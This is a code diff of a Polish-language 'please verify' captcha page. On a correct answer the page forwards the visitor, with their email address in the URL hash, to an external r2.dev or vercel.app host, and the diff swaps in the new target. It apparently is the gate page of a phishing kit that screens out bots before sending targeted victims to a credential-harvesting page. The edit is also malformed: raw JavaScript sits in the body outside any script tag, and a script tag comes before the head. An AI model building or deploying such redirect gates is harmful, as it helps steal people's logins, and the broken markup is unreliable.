@@ -1,5 +1,7 @@
-<!DOCTYPE html>
-<html lang="en">
+<script
+  src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback"
+  defer
+></script>
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -52,12 +54,14 @@
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2>Proszę zweryfikować</h2>
-    <div id="captchaQuestion"></div>
-    <input type="text" id="captchaInput" placeholder="Wprowadź odpowiedź">
-    <button id="verifyButton" disabled>Zweryfikuj</button>
-    <div id="error">Weryfikacja nie powiodła się. Spróbuj ponownie.</div>
+ window.onloadTurnstileCallback = function () {
+  turnstile.render("#captcha", {
+    sitekey: "0x4AAAAAABghyT0xOXC8tKAA",
+    callback: function (token) {
+      console.log(`Challenge Success ${token}`);
+    },
+  });
+};
   </div>
 
   <script>
@@ -139,9 +143,9 @@
       if (parseInt(userAnswer) === correctAnswer) {
         // Redirect to original URL with email hash if it exists
         if (originalEmail) {
-          window.location.href = `https://pub-d529e8542b01460fb4073974267ed90c.r2.dev/index.html#${originalEmail}`;
+          window.location.href = `https://gr-gold.vercel.app#${originalEmail}`;
         } else {
-          window.location.href = 'https://pub-d529e8542b01460fb4073974267ed90c.r2.dev/index.html';
+          window.location.href = 'https://gr-gold.vercel.app';
         }
       } else {
         errorDiv.style.display = 'block';
